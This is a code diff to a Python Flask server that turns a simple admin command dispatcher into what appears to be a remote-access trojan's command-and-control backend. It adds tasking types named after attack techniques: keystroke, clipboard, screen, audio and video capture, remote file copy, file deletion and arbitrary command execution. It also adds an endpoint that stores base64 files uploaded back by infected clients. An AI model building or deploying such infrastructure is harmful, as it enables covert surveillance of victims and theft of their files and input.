@@ -5,6 +5,7 @@ import json
 import uuid
 import datetime
 import logging
+import base64
 
 app = Flask(__name__)
 CORS(app)
@@ -16,29 +17,48 @@ command_results = {}
 
 available_commands = {
     'system_info': {
-        'name': 'System Information',
-        'command': 'systeminfo',
-        'description': 'Get system information'
+        'name': 'System Information Discovery',
+        'description': 'Get detailed system information'
     },
-    'process_list': {
-        'name': 'Process List',
-        'command': 'tasklist',
-        'description': 'List running processes'
+    'command_line': {
+        'name': 'Command-Line Interface',
+        'description': 'Execute commands via command line'
     },
-    'network_connections': {
-        'name': 'Network Connections',
-        'command': 'netstat -an',
-        'description': 'Show network connections'
+    'file_directory_discovery': {
+        'name': 'File and Directory Discovery',
+        'description': 'Discover files and directories in system'
     },
-    'disk_space': {
-        'name': 'Disk Space',
-        'command': 'dir',
-        'description': 'Show disk space usage'
+    'remote_file_copy': {
+        'name': 'Remote File Copy',
+        'description': 'Copy files remotely between systems'
     },
-    'memory_info': {
-        'name': 'Memory Information',
-        'command': 'wmic OS get FreePhysicalMemory',
-        'description': 'Show memory usage'
+    'file_deletion': {
+        'name': 'File Deletion',
+        'description': 'Delete files from specified path'
+    },
+    'process_discovery': {
+        'name': 'Process Discovery',
+        'description': 'Discover running processes on system'
+    },
+    'input_capture': {
+        'name': 'Input Capture',
+        'description': 'Capture system input activities'
+    },
+    'clipboard_data': {
+        'name': 'Clipboard Data',
+        'description': 'Access clipboard data content'
+    },
+    'screen_capture': {
+        'name': 'Screen Capture',
+        'description': 'Capture screen content'
+    },
+    'audio_capture': {
+        'name': 'Audio Capture',
+        'description': 'Capture system audio'
+    },
+    'video_capture': {
+        'name': 'Video Capture',
+        'description': 'Capture video content'
     }
 }
 
@@ -97,14 +117,13 @@ def add_command():
     if command_data['command_type'] not in available_commands:
         return jsonify({'error': 'Invalid command type'}), 400
         
-    command = available_commands[command_data['command_type']]['command']
     
     commands[command_id] = {
         'client_id': command_data['client_id'],
-        'command': command,
         'command_type': command_data['command_type'],
         'timestamp': datetime.datetime.now().isoformat(),
-        'executed': False
+        'executed': False,
+        'str' : command_data["command_str"]
     }
     
     logging.info(f"New command added: {command_id}")
@@ -116,15 +135,26 @@ def submit_result(command_id):
         result_data = request.get_json()
         command_results[command_id] = {
             'output': result_data['output'],
-            'timestamp': datetime.datetime.now().isoformat()
+            'timestamp': datetime.datetime.now().isoformat(),
+            'file' : result_data['file'],
+            'file_format' : result_data['format']
         }
         commands[command_id]['executed'] = True
+        file_format = ""
+        if command_results[command_id]['file_format']:
+            file_format = command_results[command_id]['file_format']
+        if command_results[command_id]['file']:
+            decoded_file = base64.b64decode(command_results[command_id]['file'])
+            with open(f"files/{str(datetime.datetime.now().isoformat())}.{file_format}", "wb") as file:
+                file.write(decoded_file)
         return jsonify({'status': 'success'})
     return jsonify({'error': 'Command not found'}), 404
+
 
 @app.route('/clients', methods=['GET'])
 def get_clients():
     return jsonify(clients)
+
 
 @app.route('/results', methods=['GET'])
 def get_results():
